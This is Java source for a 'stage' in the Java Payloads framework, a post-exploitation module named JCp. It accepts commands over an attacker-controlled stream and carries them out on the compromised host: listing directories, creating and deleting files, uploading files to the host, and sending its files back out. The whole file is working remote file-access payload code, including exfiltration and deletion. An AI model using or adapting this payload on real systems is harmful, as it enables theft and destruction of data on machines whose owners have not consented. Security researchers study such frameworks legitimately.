/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class JCp implements Stage {

	public static final int JCP_END = 0;
	public static final int JCP_MKDIR = 10;
	public static final int JCP_RM = 11;
	public static final int JCP_LS = 12;
	public static final int JCP_CP_SEND = 5;
	public static final int JCP_CP_RECV = 6;
	public static final int JCP_CP_LOCAL = 13;

	/**
	 * Forward data from one stream to another. Closes neither of the stream.
	 * Stop at a given byte limit.
	 */
	public static void forwardLimited(InputStream in, OutputStream out, long limit) throws IOException {
		final byte[] buf = new byte[4096];
		while (limit > 0) {
			int len;
			int remaining = limit > (long) buf.length ? buf.length : (int) limit;
			if ((len = in.read(buf, 0, remaining)) == -1)
				break;
			out.write(buf, 0, len);
			limit -= len;
		}
	}

	public void start(DataInputStream in, OutputStream originalOut, String[] parameters) throws Exception {
		DataOutputStream out = new DataOutputStream(originalOut);
		while (true) {
			int mode = in.readByte();
			String arg = in.readUTF();
			String response;
			try {
				switch (mode) {
				case JCP_END:
					response = null;
					break;
				case JCP_MKDIR:
					if (!new File(arg).mkdirs()) {
						throw new IOException("Creating directory failed");
					}
					response = "Directory created.";
					break;
				case JCP_RM:
					if (!new File(arg).delete()) {
						throw new IOException("Deleting directory/file failed");
					}
					response = "File/directory deleted.";
					break;
				case JCP_LS:
					final File[] dir = new File(arg).listFiles();
					response = "";
					if (dir == null) {
						response = "Not a directory: " + arg;
					} else {
						response = dir.length + " files/directories in " + arg + "\r\n\r\n";
						for (int i = 0; i < dir.length; i++) {
							response += dir[i].getName() + "\t" + (dir[i].isDirectory() ? "[DIR]" : "" + dir[i].length()) + "\t" + new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(dir[i].lastModified())) + "\r\n";
						}
					}
					break;
				case JCP_CP_SEND: {
					File f = new File(arg);
					long len = f.length();
					out.writeLong(len);
					FileInputStream fis = new FileInputStream(f);
					forwardLimited(fis, out, len);
					fis.close();
					response = len + " bytes sent.";
					break;
				}
				case JCP_CP_RECV: {
					long len = in.readLong();
					FileOutputStream fos = new FileOutputStream(arg);
					forwardLimited(in, fos, len);
					fos.close();
					response = len + " bytes received.";
					break;
				}
				case JCP_CP_LOCAL: {
					File f = new File(arg);
					long len = f.length();
					FileInputStream fis = new FileInputStream(f);
					FileOutputStream fos = new FileOutputStream(in.readUTF());
					forwardLimited(fis, fos, len);
					fis.close();
					fos.close();
					response = len + " bytes copied.";
					break;
				}
				default:
					throw new IllegalArgumentException("Unsupported mode: " + mode);
				}
			} catch (Exception ex) {
				StringWriter sw = new StringWriter();
				ex.printStackTrace(new PrintWriter(sw));
				response = sw.toString();
			}
			if (response == null)
				break;
			out.writeUTF(response);
			out.flush();
		}
		while (in.read() != -1)
			;
		out.close();
	}
}